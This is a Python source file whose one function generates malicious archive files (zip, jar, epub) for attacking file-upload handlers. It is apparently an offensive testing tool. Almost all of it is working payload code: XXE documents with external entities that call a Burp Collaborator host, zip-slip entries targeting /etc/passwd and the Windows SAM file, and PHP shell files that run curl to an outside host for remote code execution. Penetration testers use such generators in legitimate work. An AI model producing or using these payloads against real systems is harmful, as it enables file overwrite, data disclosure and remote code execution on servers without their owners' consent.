from pathlib import Path
import zipfile
import tempfile

def generate_archive_payloads(output_dir, ext, burp_collab):
    output_dir = Path(output_dir)
    base_url = f"http://{burp_collab}"
    
    if ext in ['zip', 'jar', 'epub']:
        output_dir.mkdir(parents=True, exist_ok=True)
        
        xxe_dir = output_dir / 'xxe'
        xxe_dir.mkdir(exist_ok=True)
        path_traversal_dir = output_dir / 'path_traversal'
        path_traversal_dir.mkdir(exist_ok=True)
        rce_dir = output_dir / 'rce'
        rce_dir.mkdir(exist_ok=True)
        
        xml_content_xxe1 = f'''<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE root [
<!ENTITY xxe SYSTEM "{base_url}/xxe-{ext}-1">
]>
<root>
<data>&xxe;</data>
</root>'''
        
        output_file = xxe_dir / f"xxe1_doctype.{ext}"
        with tempfile.TemporaryDirectory() as temp_dir:
            temp_path = Path(temp_dir)
            xml_file = temp_path / "test.xml"
            xml_file.write_text(xml_content_xxe1)
            
            with zipfile.ZipFile(output_file, 'w', zipfile.ZIP_DEFLATED) as zip_ref:
                zip_ref.write(xml_file, 'test.xml')
        
        xml_content_xxe2 = f'''<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE root [
<!ENTITY % xxe SYSTEM "{base_url}/xxe-{ext}-2">
%xxe;
]>
<root>
<data>test</data>
</root>'''
        
        output_file = xxe_dir / f"xxe2_parameter.{ext}"
        with tempfile.TemporaryDirectory() as temp_dir:
            temp_path = Path(temp_dir)
            xml_file = temp_path / "test.xml"
            xml_file.write_text(xml_content_xxe2)
            
            with zipfile.ZipFile(output_file, 'w', zipfile.ZIP_DEFLATED) as zip_ref:
                zip_ref.write(xml_file, 'test.xml')
        
        output_file = path_traversal_dir / f"path1_relative.{ext}"
        with tempfile.TemporaryDirectory() as temp_dir:
            temp_path = Path(temp_dir)
            test_file = temp_path / "test.txt"
            test_file.write_text("test")
            
            with zipfile.ZipFile(output_file, 'w', zipfile.ZIP_DEFLATED) as zip_ref:
                zip_ref.write(test_file, "../../../etc/passwd")
        
        output_file = path_traversal_dir / f"path2_windows.{ext}"
        with tempfile.TemporaryDirectory() as temp_dir:
            temp_path = Path(temp_dir)
            test_file = temp_path / "test.txt"
            test_file.write_text("test")
            
            with zipfile.ZipFile(output_file, 'w', zipfile.ZIP_DEFLATED) as zip_ref:
                zip_ref.write(test_file, "..\\..\\..\\windows\\system32\\config\\sam")
        
        if ext in ['zip', 'jar']:
            php_content_rce1 = f"<?php system('curl {base_url}/rce-{ext}-system'); ?>"
            output_file = rce_dir / f"rce1_php_system.{ext}"
            with tempfile.TemporaryDirectory() as temp_dir:
                temp_path = Path(temp_dir)
                php_file = temp_path / "shell.php"
                php_file.write_text(php_content_rce1)
                
                with zipfile.ZipFile(output_file, 'w', zipfile.ZIP_DEFLATED) as zip_ref:
                    zip_ref.write(php_file, 'shell.php')
            
            php_content_rce2 = f"<?php exec('curl {base_url}/rce-{ext}-exec'); ?>"
            output_file = rce_dir / f"rce2_php_exec.{ext}"
            with tempfile.TemporaryDirectory() as temp_dir:
                temp_path = Path(temp_dir)
                php_file = temp_path / "shell.php"
                php_file.write_text(php_content_rce2)
                
                with zipfile.ZipFile(output_file, 'w', zipfile.ZIP_DEFLATED) as zip_ref:
                    zip_ref.write(php_file, 'shell.php')
        
        master_file = output_dir / f"master.{ext}"
        with tempfile.TemporaryDirectory() as temp_dir:
            temp_path = Path(temp_dir)
            xml_file = temp_path / "test.xml"
            xml_file.write_text(xml_content_xxe1)
            
            test_file = temp_path / "test.txt"
            test_file.write_text("test")
            
            with zipfile.ZipFile(master_file, 'w', zipfile.ZIP_DEFLATED) as zip_ref:
                zip_ref.write(xml_file, 'test.xml')
                if ext in ['zip', 'jar']:
                    php_file = temp_path / "shell.php"
                    php_file.write_text(php_content_rce1)
                    zip_ref.write(php_file, 'shell.php')
